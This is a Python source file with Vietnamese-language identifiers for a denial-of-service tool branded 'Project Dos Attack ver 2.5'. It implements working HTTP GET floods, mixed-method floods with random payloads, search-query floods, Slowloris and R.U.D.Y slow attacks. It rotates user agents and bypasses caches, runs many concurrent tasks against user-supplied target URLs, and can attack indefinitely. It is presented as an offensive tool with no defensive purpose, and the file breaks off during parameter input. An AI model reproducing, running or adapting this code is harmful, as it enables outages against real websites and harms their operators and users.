import requests
import threading
import random
import time
import os
import asyncio
import aiohttp
import socket
from rich.console import Console
from rich.style import Style
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
from rich.prompt import Prompt, Confirm
from rich.tree import Tree
from urllib.parse import urlparse
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import locale
import ssl

locale.setlocale(locale.LC_ALL, '')

console = Console()
thoi_gian_timeout = 20  # điều chỉnh để tránh bị lỗi timeout ở máy mình

# --- Màu sắc ---
mau_hong = Style(color="pink1")
mau_cam = Style(color="orange1")
mau_chu_tieu_de = Style(color="deep_sky_blue1", bold=True)

# --- Biến toàn cục ---
yeu_cau_thanh_cong = 0
yeu_cau_that_bai = 0
tong_so_yeu_cau = 0
dung_tan_cong = False
thoi_gian_da_troi = 0
tien_trinh = {}  # Sử dụng từ điển để lưu tiến trình cho từng URL
lock = threading.Lock()  # Thêm khóa
# Danh sách headers đã sử dụng cho từng phương thức
headers_da_su_dung = {
    "slowloris": {},
    "rudy": {}
}
# Biến toàn cục để lưu cách lấy headers
cach_lay_headers = {}

def in_bieu_tuong(bieu_tuong):
    console.print(bieu_tuong, style=mau_hong)

def doc_danh_sach_url(ten_file):
    """Đọc danh sách URL từ file và kiểm tra tính hợp lệ."""
    try:
        danh_sach_url = []
        with open(ten_file, 'r') as f:
            for line in f:
                url = line.strip()
                if not urlparse(url).scheme or not urlparse(url).netloc:
                    log_message(f"[red]URL không hợp lệ: {url}[/]")
                    continue
                danh_sach_url.append(url)
        return danh_sach_url
    except FileNotFoundError:
        console.print(f"Lỗi: Không tìm thấy file '{ten_file}'.", style="bold red")
        return []

def doc_danh_sach_user_agent(ten_file="user_agents.txt"):
    try:
        with open(ten_file, 'r') as f:
            user_agents = f.read().splitlines()
        return user_agents
    except FileNotFoundError:
        console.print(
            f"Lỗi: Không tìm thấy file '{ten_file}'. Sử dụng User-Agent mặc định.", style="yellow")
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        ]
danh_sach_user_agent_lon = []

def lay_ngau_nhien_user_agent():
    if not danh_sach_user_agent_lon:
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    return random.choice(danh_sach_user_agent_lon)

def tao_session():
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=0.1,
                    status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(
        max_retries=retries, pool_connections=100, pool_maxsize=100)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def tao_bang_trang_thai(danh_sach_muc_tieu, so_luong_luong, thoi_gian_da_troi, thoi_gian_tan_cong, tien_trinh, yeu_cau_thanh_cong, yeu_cau_that_bai, tong_so_yeu_cau):
    bang = Table(
        title="[dark_orange]Trạng thái tấn công[/]", style="light_steel_blue1")
    bang.add_column("Mục", style="cyan", width=18)
    bang.add_column("Giá trị", style="magenta")
    bang.add_row("Tổng số luồng", str(so_luong_luong), style="dark_orange")
    bang.add_row("Tổng số yêu cầu",
                 str(tong_so_yeu_cau), style=mau_hong)
    bang.add_row("Yêu cầu thành công",
                 str(yeu_cau_thanh_cong), style="chartreuse1")
    bang.add_row("Yêu cầu thất bại",
                 str(yeu_cau_that_bai), style="orange_red1")
    bang.add_row(
        "Thời gian", f"{int(thoi_gian_da_troi)}/{thoi_gian_tan_cong} (giây)", style="pink1")
    bang.add_row()
    bang.add_row("[grey100]Tiến trình chi tiết[/]",
                 style="pink1")

    for url, progress_info in tien_trinh.items():
        bang.add_row(f"[i]{url}[/]", f"{progress_info['completed']}/{progress_info['total']} ({progress_info['percentage']:.2f}%) - {progress_info['speed']:.2f} req/s", style="pink1")

    return bang

def cap_nhat_tien_trinh(danh_sach_muc_tieu, thoi_gian_tan_cong):
    global thoi_gian_da_troi

    for url in danh_sach_muc_tieu:
        tien_trinh[url] = {
            "completed": 0,
            "total": thoi_gian_tan_cong * so_luong_luong if thoi_gian_tan_cong > 0 else float('inf'),
            "percentage": 0,
            "speed": 0,
            "start_time": time.time()
        }

    while not dung_tan_cong:
        for url in danh_sach_muc_tieu:
            if thoi_gian_tan_cong > 0:
                tien_trinh[url]["percentage"] = min(
                    100, (tien_trinh[url]["completed"] / tien_trinh[url]["total"]) * 100)
            else:
                tien_trinh[url]["percentage"] = 0
            tien_trinh[url]["speed"] = tien_trinh[url]["completed"] / \
                (time.time() - tien_trinh[url]["start_time"] + 1e-9)
            if thoi_gian_da_troi >= thoi_gian_tan_cong and thoi_gian_tan_cong > 0:
                tien_trinh[url]["percentage"] = 100

        yield tien_trinh

def in_trang_thai(danh_sach_muc_tieu, so_luong_luong, thoi_gian_tan_cong):
    global thoi_gian_da_troi, yeu_cau_thanh_cong, yeu_cau_that_bai, tong_so_yeu_cau
    thoi_gian_bat_dau = time.time()

    with Live(console=console, refresh_per_second=10) as live:
        for _ in cap_nhat_tien_trinh(danh_sach_muc_tieu, thoi_gian_tan_cong):

            thoi_gian_da_troi = time.time() - thoi_gian_bat_dau
            if thoi_gian_tan_cong > 0 and thoi_gian_da_troi >= thoi_gian_tan_cong:
                stop_attack()
                break

            bang_trang_thai = tao_bang_trang_thai(
                danh_sach_muc_tieu, so_luong_luong, thoi_gian_da_troi, thoi_gian_tan_cong, tien_trinh, yeu_cau_thanh_cong, yeu_cau_that_bai, tong_so_yeu_cau)
            layout = Layout()
            layout.split_row(
                Layout(name="left"),
                Layout(name="right"),
            )
            layout["left"].update(bang_trang_thai)
            if hasattr(in_trang_thai, "logs_panel"):
                layout["right"].update(in_trang_thai.logs_panel)
            live.update(layout)
            time.sleep(toc_do_lam_moi)

def log_message(message, user_agent=None):
    """Ghi log vào console và file, xử lý lỗi Unicode, và thêm user agent."""
    if not hasattr(in_trang_thai, "logs"):
        in_trang_thai.logs = []

    # Thêm user agent vào thông điệp log nếu có
    log_entry = f"{message} - User-Agent: {user_agent}" if user_agent else message
    in_trang_thai.logs.append(log_entry)
    if len(in_trang_thai.logs) > 10:
        in_trang_thai.logs.pop(0)

    log_table = Table(
        title="[dark_orange]Hoạt động gần đây[/]", show_header=False, style="light_steel_blue1")
    log_table.add_column("Log")
    for log in reversed(in_trang_thai.logs):
        log_table.add_row(log)
    in_trang_thai.logs_panel = Panel(
        log_table, border_style="light_steel_blue1")

    # Ghi log vào file (nếu bấm y lúc yêu hỏi ghi log)
    if luu_log:
        try:
            with open("attack_log.txt", "a", encoding="utf-8") as log_file:
                log_file.write(log_entry + "\n")
        except UnicodeEncodeError as e:
            console.print(f"Lỗi ghi log vào file: {e}", style="bold red")
            try:
                with open("attack_log.txt", "a", encoding="ascii", errors="ignore") as log_file:
                    log_file.write(log_entry.encode(
                        'ascii', 'ignore').decode('ascii') + "\n")
            except Exception as ex:
                console.print(
                    f"Lỗi ghi log (ascii) vào file : {ex}", style="bold red")


def lay_headers_tu_dong(url, method):
    """Hàm này để lấy các headers tự động dựa trên phương thức và URL."""
    headers = {
        'User-Agent': lay_ngau_nhien_user_agent(),
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }

    if method == "slowloris":
        # Thêm headers cần thiết cho Slowloris
        headers['X-a'] = str(random.randint(1, 5000))

        if urlparse(url).scheme == 'https':
             headers['HTTPS'] = '1'

    elif method == "rudy":
        # Thêm headers cần thiết cho R.U.D.Y
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        # Thử nghiệm 1 header giả mạo khác
        headers['X-RUDY'] = '1'


    global headers_da_su_dung
    headers_da_su_dung[method][url] = headers
    return headers

def tao_headers_da_dang(url, custom_headers=None):
    headers = {
        'User-Agent': lay_ngau_nhien_user_agent(),
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
        'Referer':  f'https://www.google.com/search?q={random.choice(search_keywords)}' if search_keywords and search_url_bases else 'https://www.google.com/'
    }
    if custom_headers:
        headers.update(custom_headers)
    return headers

async def tan_cong_url_get(session, url, headers, sem):
    """Tấn công URL bằng phương thức GET (sử dụng aiohttp)."""
    global yeu_cau_thanh_cong, yeu_cau_that_bai, tong_so_yeu_cau, thoi_gian_da_troi

    async with sem:
        while not dung_tan_cong:
            # Lấy User-Agent NGẪU NHIÊN cho MỖI request
            headers['User-Agent'] = lay_ngau_nhien_user_agent()

            url_with_params = f"{url}?{random.randint(1000, 9999)}={random.randint(1000, 9999)}" if random.choice([True, False]) else url
            try:
                async with session.get(url_with_params, headers=headers, timeout=thoi_gian_timeout) as phan_hoi:
                    with lock:
                        if phan_hoi.status == 200:
                            yeu_cau_thanh_cong += 1
                            log_message(
                                f"[green]Yêu cầu GET thành công đến: {url_with_params}[/]", headers['User-Agent'])
                        else:
                            yeu_cau_that_bai += 1
                            log_message(
                                f"[red]Yêu cầu GET thất bại đến: {url_with_params} - Mã trạng thái: {phan_hoi.status}[/]", headers['User-Agent']) 
                        tong_so_yeu_cau += 1
                        tien_trinh[url]['completed'] += 1

            except asyncio.TimeoutError:
                with lock:
                    yeu_cau_that_bai += 1
                    log_message(
                        f"[red]Yêu cầu GET bị timeout đến: {url_with_params}[/]", headers['User-Agent'])
                    tong_so_yeu_cau += 1
                    tien_trinh[url]['completed'] += 1

            except aiohttp.ClientError as e:
                with lock:
                    yeu_cau_that_bai += 1
                    log_message(
                        f"[red]Lỗi kết nối đến {url_with_params}: {e}[/]", headers['User-Agent'])  # Sử dụng headers['User-Agent']
                    tong_so_yeu_cau += 1
                    tien_trinh[url]['completed'] += 1

            except Exception as e:
                with lock:
                    console.print(
                        f"Đã xảy ra lỗi: {e}", style='bold red')
                    yeu_cau_that_bai += 1
                    tong_so_yeu_cau += 1
                    tien_trinh[url]['completed'] += 1


async def tan_cong_url_mixed(session, url, headers, method, sem):
    """Tấn công URL bằng các phương thức khác nhau (sử dụng aiohttp)."""
    global yeu_cau_thanh_cong, yeu_cau_that_bai, tong_so_yeu_cau

    async with sem:
        while not dung_tan_cong:
            # Lấy User-Agent NGẪU NHIÊN cho MỖI request
            headers['User-Agent'] = lay_ngau_nhien_user_agent()
            try:
                if method == 'GET':
                    url_with_params = f"{url}?{random.randint(1000, 9999)}={random.randint(1000, 9999)}" if random.choice([True, False]) else url
                    async with session.get(url_with_params, headers=headers, timeout=thoi_gian_timeout) as phan_hoi:
                        with lock:
                            if phan_hoi.status == 200:
                                yeu_cau_thanh_cong += 1
                                log_message(f"[green]Mô phỏng {method} thành công: {url_with_params}[/]", headers['User-Agent'])
                            else:
                                yeu_cau_that_bai += 1
                                log_message(f"[red]Mô phỏng {method} thất bại: {url_with_params} - Mã trạng thái: {phan_hoi.status}[/]", headers['User-Agent'])

                elif method == 'POST':
                    data_size = random.randint(100, 1000)
                    data = os.urandom(data_size)
                    async with session.post(url, headers=headers, data=data, timeout=thoi_gian_timeout) as phan_hoi:
                        with lock:
                            if phan_hoi.status == 200:
                                yeu_cau_thanh_cong += 1
                                log_message(f"[green]Mô phỏng {method} thành công: {url} - Kích thước dữ liệu: {data_size} bytes[/]", headers['User-Agent'])
                            else:
                                yeu_cau_that_bai += 1
                                log_message(f"[red]Mô phỏng {method} thất bại: {url} - Mã trạng thái: {phan_hoi.status}[/]", headers['User-Agent'])
                elif method == 'PUT':
                    data_size = random.randint(100, 1000)
                    data = os.urandom(data_size)
                    async with session.put(url, headers=headers, data=data, timeout=thoi_gian_timeout) as phan_hoi:
                        with lock:
                            if phan_hoi.status == 200:
                                yeu_cau_thanh_cong += 1
                                log_message(f"[green]Mô phỏng {method} thành công: {url} - Kích thước dữ liệu: {data_size} bytes[/]", headers['User-Agent'])
                            else:
                                yeu_cau_that_bai += 1
                                log_message(f"[red]Mô phỏng {method} thất bại: {url} - Mã trạng thái: {phan_hoi.status}[/]", headers['User-Agent'])
                elif method == 'DELETE':
                    async with session.delete(url, headers=headers, timeout=thoi_gian_timeout) as phan_hoi:
                        with lock:
                            if phan_hoi.status == 200:
                                yeu_cau_thanh_cong += 1
                                log_message(f"[green]Mô phỏng {method} thành công: {url}[/]", headers['User-Agent'])
                            else:
                                yeu_cau_that_bai += 1
                                log_message(f"[red]Mô phỏng {method} thất bại: {url} - Mã trạng thái: {phan_hoi.status}[/]", headers['User-Agent'])
                else:
                    with lock:
                        console.print(f"Phương thức {method} chưa được hỗ trợ.", style="yellow")
                        continue

            except asyncio.TimeoutError:
                with lock:
                    yeu_cau_that_bai += 1
                    log_message(
                        f"[red]Yêu cầu {method} bị timeout đến: {url}[/]", headers['User-Agent'])

            except aiohttp.ClientError as e:
                with lock:
                    yeu_cau_that_bai += 1
                    log_message(f"[red]Lỗi kết nối: {e}[/]", headers['User-Agent'])

            except Exception as e:
                with lock:
                    log_message(
                        f"Đã xảy ra lỗi không mong đợi: {e}[/]", headers['User-Agent'])
                    console.print(
                        f"Đã xảy ra lỗi không mong đợi: {e}", style="bold red")
            finally:
                with lock:
                    tong_so_yeu_cau += 1
                    tien_trinh[url]['completed'] += 1

async def tan_cong_url_search(session, url_base, headers, tu_khoa, sem):
    """Tấn công URL tìm kiếm (sử dụng aiohttp)."""
    global yeu_cau_thanh_cong, yeu_cau_that_bai, tong_so_yeu_cau

    async with sem:
        while not dung_tan_cong:
           # Lấy User-Agent NGẪU NHIÊN cho MỖI request
            headers['User-Agent'] = lay_ngau_nhien_user_agent()

            try:
                tu_khoa_chon = " ".join(random.sample(tu_khoa, random.randint(1, min(3, len(tu_khoa))))) if tu_khoa else ""
                search_url = f"{url_base}{tu_khoa_chon}"
                async with session.get(search_url, headers=headers, timeout=thoi_gian_timeout) as phan_hoi:
                    with lock:
                        if phan_hoi.status == 200:
                            yeu_cau_thanh_cong += 1
                            log_message(f"[green]Tìm kiếm thành công với từ khóa: {tu_khoa_chon} - URL: {search_url}[/]", headers['User-Agent'])
                        else:
                            yeu_cau_that_bai += 1
                            log_message(f"[red]Tìm kiếm thất bại với từ khóa: {tu_khoa_chon} - URL: {search_url} - Mã trạng thái: {phan_hoi.status}[/]", headers['User-Agent'])

            except asyncio.TimeoutError:
                with lock:
                    yeu_cau_that_bai += 1
                    log_message(f"[red]Yêu cầu tìm kiếm bị timeout đến: {search_url}[/]", headers['User-Agent'])

            except aiohttp.ClientError as e:
                with lock:
                    yeu_cau_that_bai += 1
                    log_message(f"[red]Lỗi kết nối khi tìm kiếm: {e}[/]", headers['User-Agent'])

            except Exception as e:
                with lock:
                    log_message(f"Đã xảy ra lỗi không mong đợi khi tìm kiếm: {e}[/]", headers['User-Agent'])
                    console.print(f"Đã xảy ra lỗi không mong đợi khi tìm kiếm: {e}", style="bold red")
            finally:
                with lock:
                    tong_so_yeu_cau += 1

async def slowloris_attack(session, url, headers, sem, ports=[80, 443]):
    """Tấn công Slowloris."""
    global yeu_cau_thanh_cong, yeu_cau_that_bai, tong_so_yeu_cau

    async with sem:
        while not dung_tan_cong:
            sockets = []
            for port in ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)

                    if port == 443:
                        context = ssl.create_default_context()
                        s = context.wrap_socket(
                            s, server_hostname=urlparse(url).hostname)
                        protocol = "HTTPS"
                    else:
                         protocol = "HTTP"


                    s.connect((urlparse(url).hostname, port))
                    sockets.append(s)


                    # Lấy User-Agent NGẪU NHIÊN cho MỖI request (initial request)
                    headers['User-Agent'] = lay_ngau_nhien_user_agent()
                    request = f"GET {url} {protocol}/1.1\r\n"
                    for header, value in headers.items():
                        request += f"{header}: {value}\r\n"
                    request += "\r\n"
                    s.send(request.encode())

                    log_message(
                        f"[yellow]Đã gửi header đến {url}:{port} (Slowloris)...[/]", headers['User-Agent'])

                except socket.error as e:
                    with lock:
                        yeu_cau_that_bai += 1
                        log_message(
                            f"[red]Lỗi Slowloris với {url}:{port}: {e}[/]", headers['User-Agent'])
                except Exception as e:
                    with lock:
                        log_message(
                            f"[red]Lỗi không xác định trong Slowloris với {url}:{port}: {e}[/]", headers['User-Agent'])

            while not dung_tan_cong:
               
                for s in sockets:
                    port = s.getpeername()[1] if s else "N/A"
                    try:
                        s.send(
                            f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    except socket.error as e:
                        with lock:
                            sockets.remove(s)
                            yeu_cau_that_bai += 1
                            log_message(
                                f"[red]Lỗi Slowloris với {url}:{port}: {e}[/]", headers['User-Agent'])
                    except Exception as e:
                        with lock:
                            sockets.remove(s)
                            log_message(
                                f"[red]Lỗi không xác định trong Slowloris với {url}:{port}: {e}[/]", headers['User-Agent'])


                for port in ports:
                    if not any(s.getpeername()[1] == port for s in sockets if s):
                        try:
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(4)

                            if port == 443:
                                context = ssl.create_default_context()
                                new_s = context.wrap_socket(
                                    new_s, server_hostname=urlparse(url).hostname)

                            new_s.connect((urlparse(url).hostname, port))


                            # Lấy User-Agent NGẪU NHIÊN cho MỖI request (new socket request)
                            headers['User-Agent'] = lay_ngau_nhien_user_agent()
                            request = f"GET {url} HTTP/1.1\r\n"
                            for header, value in headers.items():
                                request += f"{header}: {value}\r\n"
                            request += "\r\n"
                            new_s.send(request.encode())

                            log_message(
                                f"[yellow]Đã tạo socket mới cho {url}:{port} (Slowloris)...[/]", headers['User-Agent'])
                            sockets.append(new_s)
                        except socket.error as e:
                            with lock:
                                yeu_cau_that_bai += 1
                                log_message(
                                    f"[red]Lỗi Slowloris với {url}:{port}: {e}[/]", headers['User-Agent'])
                        except Exception as e:
                            with lock:
                                log_message(
                                    f"[red]Lỗi không xác định trong Slowloris với {url}:{port}: {e}[/]", headers['User-Agent'])

                if not sockets:
                    log_message(
                        "[red]Không còn socket nào hoạt động, kết thúc Slowloris...[/]", headers['User-Agent'])
                    break

                await asyncio.sleep(15)

                for s in sockets:
                    if s:
                        s.close()

            with lock:
                tong_so_yeu_cau += 1
                tien_trinh[url]['completed'] += 1

async def rudy_attack(session, url, headers, sem):
    """Tấn công R.U.D.Y."""
    global yeu_cau_thanh_cong, yeu_cau_that_bai, tong_so_yeu_cau

    async with sem:
        while not dung_tan_cong:
            s = None
            try:
                # Lấy User-Agent NGẪU NHIÊN cho MỖI request (initial request)
                headers['User-Agent'] = lay_ngau_nhien_user_agent()
                log_message(f"[yellow]Đang thử kết nối đến {url} cho R.U.D.Y...[/]", headers['User-Agent'])
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((urlparse(url).hostname, 80))
                log_message(f"[green]Kết nối thành công đến {url} cho R.U.D.Y.[/]", headers['User-Agent'])

                request = f"POST {url} HTTP/1.1\r\n"
                for header, value in headers.items():
                    request += f"{header}: {value}\r\n"
                request += f"Content-Length: {random.randint(5000, 10000)}\r\n\r\n" # Sửa content-length lớn, random
                s.send(request.encode())
                log_message(f"[yellow]Đã gửi POST header đến {url} (R.U.D.Y)...[/]", headers['User-Agent'])

                # Gửi từng byte dữ liệu với độ trễ
                while not dung_tan_cong:
                    data = os.urandom(1)
                    try:
                        s.send(data)
                        log_message(f"[yellow]Đã gửi 1 byte dữ liệu đến {url} (R.U.D.Y)...[/]", headers['User-Agent'])
                    except socket.error as e:
                        with lock:
                            yeu_cau_that_bai += 1
                            log_message(f"[red]Lỗi R.U.D.Y với {url}: {e}[/]", headers['User-Agent'])
                            break
                    await asyncio.sleep(random.uniform(5, 15))  # Gửi 1 byte sau 5-15 giây

            except socket.error as e:
                with lock:
                    yeu_cau_that_bai += 1
                    log_message(f"[red]Lỗi R.U.D.Y với {url}: {e}[/]", headers['User-Agent'])
            except Exception as e:
                with lock:
                    log_message(f"[red]Lỗi không xác định trong R.U.D.Y với {url}: {e}[/]", headers['User-Agent'])
            finally:
                with lock:
                    if s:
                        s.close()
                    tong_so_yeu_cau += 1
                    tien_trinh[url]['completed'] += 1

async def tan_cong_tong_the(danh_sach_url, so_luong_luong, phuong_thuc_tan_cong, methods, search_url_bases, search_keywords, custom_headers, ports):
    """Tấn công đồng thời nhiều URL (sử dụng aiohttp)."""
    global yeu_cau_thanh_cong, yeu_cau_that_bai, tong_so_yeu_cau
    tasks = []

    sems = {url: asyncio.Semaphore(so_luong_luong)
            for url in danh_sach_url}

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, ssl=False)) as session:
      for url in danh_sach_muc_tieu:
          sem = sems[url]

          if phuong_thuc_tan_cong == 'slowloris':
              if cach_lay_headers[url] == "auto":
                headers = lay_headers_tu_dong(url, "slowloris")
              else:
                headers = custom_headers
              for _ in range(so_luong_luong):
                  task = asyncio.ensure_future(
                        slowloris_attack(session, url, headers, sem, ports=ports))
                  tasks.append(task)
          elif phuong_thuc_tan_cong == 'rudy':
              if cach_lay_headers[url] == "auto":
                headers = lay_headers_tu_dong(url, "rudy")
              else:
                headers = custom_headers
              for _ in range(so_luong_luong):
                  task = asyncio.ensure_future(
                        rudy_attack(session, url, headers, sem))
                  tasks.append(task)
          else:
                headers = tao_headers_da_dang(url, custom_headers)


          if phuong_thuc_tan_cong == 'get':
            for _ in range(so_luong_luong):
                task = asyncio.ensure_future(
                    tan_cong_url_get(session, url, headers, sem))
                tasks.append(task)
          elif phuong_thuc_tan_cong == 'mixed':
              for _ in range(so_luong_luong):
                  method = random.choice(methods) if len(methods) > 1 else methods[0]
                  task = asyncio.ensure_future(tan_cong_url_mixed(session, url, headers, method, sem))
                  tasks.append(task)

      if search_url_bases:
          for search_url_base in search_url_bases:
              headers = tao_headers_da_dang(search_url_base, custom_headers)
              sem = asyncio.Semaphore(so_luong_luong)  # Tạo semaphore mới cho mỗi URL tìm kiếm
              for _ in range(so_luong_luong):
                  task_search = asyncio.ensure_future(tan_cong_url_search(session, search_url_base, headers, search_keywords, sem))
                  tasks.append(task_search)

      await asyncio.gather(*tasks)

def stop_attack():
    """Dừng tấn công."""
    global dung_tan_cong
    dung_tan_cong = True
    console.print("\nĐang dừng tấn công...", style="yellow")
    log_message("Người dùng đã dừng kịch bản tấn công!")
    print("=" * 55)

def hien_thi_lua_chon():
    """Hiển thị các lựa chọn cấu hình và các headers đã sử dụng (nếu có)."""
    tree = Tree("📁 [pink1]DOS TOOL[/]")
    tree.add("├─── [red1]AVAILABLE METHODS[/]")
    methods_tree = tree.add("├─── [pink1]LAYER 7[/]")
    methods_tree.add("├─── [green]HTTP[/]")
    methods_tree.add("├─── [green]HTTPS[/]")
    methods_tree.add("├─── [green]SLOWLORIS[/]")
    methods_tree.add("└─── [green]R.U.D.Y[/]")

    config_tree = tree.add("└─── [bold]CURRENT CONFIG[/]")
    config_tree.add(
        f"    ├─── [bold]METHOD[/]: [deep_sky_blue1]{phuong_thuc_tan_cong}[/]")

    if phuong_thuc_tan_cong == 'mixed':
        config_tree.add(
            f"    ├─── [bold]HTTP METHODS[/]: [deep_sky_blue1]{', '.join(methods)}[/]")
    if phuong_thuc_tan_cong == 'search' and search_url_bases and search_keywords:
        for base_url in search_url_bases:
            config_tree.add(
                f"    ├─── [bold]SEARCH URL BASE[/]: [deep_sky_blue1]{base_url}[/]")
        config_tree.add(
            f"    ├─── [bold]SEARCH KEYWORDS[/]: [deep_sky_blue1]{', '.join(search_keywords)}[/]")

    config_tree.add(
        f"    ├─── [bold]TIME[/]: [deep_sky_blue1]{thoi_gian_tan_cong}[/]")
    config_tree.add(
        f"    ├─── [bold]THREADS[/]: [deep_sky_blue1]{so_luong_luong}[/]")
    if custom_headers.get('Cookie'):
        config_tree.add(
            f"    ├─── [bold]COOKIE[/]: [deep_sky_blue1]{custom_headers['Cookie']}[/]")
    if is_user_agent_from_file:
        config_tree.add(
            f"    ├─── [bold]User-Agent[/]: [deep_sky_blue1]From file ({user_agent_duoc_chon})[/]")
    else:
        config_tree.add(
            f"    ├─── [bold]User-Agent[/]: [deep_sky_blue1]{user_agent_duoc_chon}[/]")
    for url in danh_sach_muc_tieu:
        config_tree.add(
            f"    └─── [bold]URL[/]: [pink1]{url}[/]")

        if phuong_thuc_tan_cong in headers_da_su_dung and url in headers_da_su_dung[phuong_thuc_tan_cong]:
            headers_tree = config_tree.add(
                f"        └─── [bold]Headers used for {url}[/]"
            )
            for header, value in headers_da_su_dung[phuong_thuc_tan_cong][url].items():
                headers_tree.add(f"            ├─── [yellow]{header}[/]: [green]{value}[/]")

        if phuong_thuc_tan_cong in ("slowloris", "rudy"):
            cach_lay_header = cach_lay_headers.get(url, "auto")  # Mặc định là "auto" nếu không có
            config_tree.add(
                f"        └─── [bold]Headers source for {url}[/]: [deep_sky_blue1]{cach_lay_header}[/]"
            )

    console.print(tree)

def nhap_tham_so():
    """Hàm cho người dùng nhập các tham số tấn công."""

    bieu_tuong = r"""

 _____
( ___ )
 |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   |
 |   |           _____                    _____                    _____           |   |
 |   |          /\    \                  /\    \                  /\    \          |   |
 |   |         /::\    \                /::\    \                /::\____\         |   |
 |   |        /::::\    \               \:::\    \              /::::|   |         |   |
 |   |       /::::::\    \               \:::\    \            /:::::|   |         |   |
 |   |      /:::/\:::\    \               \:::\    \          /::::::|   |         |   |
 |   |     /:::/__\:::\    \               \:::\    \        /:::/|::|   |         |   |
 |   |    /::::\   \:::\    \              /::::\    \      /:::/ |::|   |         |   |
 |   |   /::::::\   \:::\    \    ____    /::::::\    \    /:::/  |::|   | _____   |   |
 |   |  /:::/\:::\   \:::\____\  /\   \  /:::/\:::\    \  /:::/   |::|   |/\    \  |   |
 |   | /:::/  \:::\   \:::|    |/::\   \/:::/  \:::\____\/:: /    |::|   /::\____\ |   |
 |   | \::/   |::::\  /:::|____|\:::\  /:::/    \::/    /\::/    /|::|  /:::/    / |   |
 |   |  \/____|:::::\/:::/    /  \:::\/:::/    / \/____/  \/____/ |::| /:::/    /  |   |
 |   |        |:::::::::/    /    \::::::/    /                   |::|/:::/    /   |   |
 |   |        |::|\::::/    /      \::::/____/                    |::::::/    /    |   |
 |   |        |::| \::/____/        \:::\    \                    |:::::/    /     |   |
 |   |        |::|  ~|               \:::\    \                   |::::/    /      |   |
 |   |        |::|   |                \:::\    \                  /:::/    /       |   |
 |   |        \::|   |                 \:::\____\                /:::/    /        |   |
 |   |         \:|   |                  \::/    /                \::/    /         |   |
 |   |          \|___|                   \/____/                  \/____/          |   |
 |   |                                                                             |   |
 |   |                            - Powered by: Rin -                              |   |
 |   |                     |   Project Dos Attack ver 2.5   |                      |   |
 |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___|
(_____)                                                                           (_____)
    """
    in_bieu_tuong(bieu_tuong)

    global so_luong_luong, thoi_gian_tan_cong, phuong_thuc_tan_cong, methods, toc_do_lam_moi, danh_sach_muc_tieu, search_url_bases, search_keywords, luu_log, custom_headers, danh_sach_user_agent_lon, is_user_agent_from_file, user_agent_duoc_chon, cach_lay_headers


    ports = []


    global is_user_agent_from_file, user_agent_duoc_chon
    danh_sach_user_agent_lon = []  # Dùng lại nên cần reset

    phuong_thuc_tan_cong = Prompt.ask(
        "[deep_sky_blue1 bold]Chọn chế độ tấn công[/]:\n[bold orange1]1.[/] Tấn công [bold green]GET[/] đơn giản (Mặc định)\n[bold orange1]2.[/] Tấn công [bold green]TÙY CHỈNH[/]\n[bold orange1]3.[/] Tấn công [bold green]SLOWLORIS[/]\n[bold orange1]4.[/] Tấn công [bold green]R.U.D.Y[/]\n[bold orange1]5.[/] Tấn công [bold green]SEARCH[/]", choices=["1", "2", "3", "4", "5"], default="1")

    # Mục tiêu
    chon_nhap_url = Prompt.ask("[deep_sky_blue1 bold]Chọn cách nhập URL mục tiêu[/]:\n[bold orange1]1.[/] Từ file\n[bold orange1]2.[/] Nhập thủ công", choices=["1", "2"], default="1")
    if chon_nhap_url == "1":
        ten_file_url = Prompt.ask("Nhập tên file chứa danh sách URL (ví dụ: url.txt)")
        danh_sach_muc_tieu = doc_danh_sach_url(ten_file_url)
    else:
        url_thu_cong = Prompt.ask("Nhập URL mục tiêu (ví dụ: https://example.com)")
        danh_sach_muc_tieu = [url_thu_cong]

    if not danh_sach_muc_tieu:
        return [], 0, 0, 0, "1", [], [], None, False, {}, []

    while True:
        try:
            so_luong_luong = int(Prompt.ask("Nhập số lượng luồng"))
            if so_luong_luong <= 0:
                console.print(
                    "Lỗi: Số lượng luồng phải lớn hơn 0.", style="bold red")
            else:
                break
        except ValueError:
            console.print("Lỗi: Số lượng luồng không hợp lệ.", style="bold red")

    while True:
        try:
            toc_do_lam_moi = float(
                Prompt.ask("Nhập tốc độ làm mới (giây, ví dụ 0.5/sec)"))
            if toc_do_lam_moi <= 0:
                console.print(
                    "Lỗi: Tốc độ làm mới phải lớn hơn 0.", style="bold red")
            else:
                break
        except ValueError:
            console.print("Lỗi: Tốc độ làm mới không hợp lệ", style="bold red")

    while True:
        try:
            thoi_gian_tan_cong = int(
                Prompt.ask("Nhập thời gian tấn công (giây, nhập 0 nếu muốn tấn công vĩnh viễn)"))
            if thoi_gian_tan_cong < 0:
                console.print(
                    "Lỗi: Thời gian tấn công không được là số âm.", style="bold red")
            else:
                break
        except ValueError:
            console.print(
                "Lỗi: Thời gian tấn công không hợp lệ", style="bold red")

    methods = []
    search_url_bases = []
    search_keywords = None
    custom_headers = {}
    them_url_tim_kiem = False

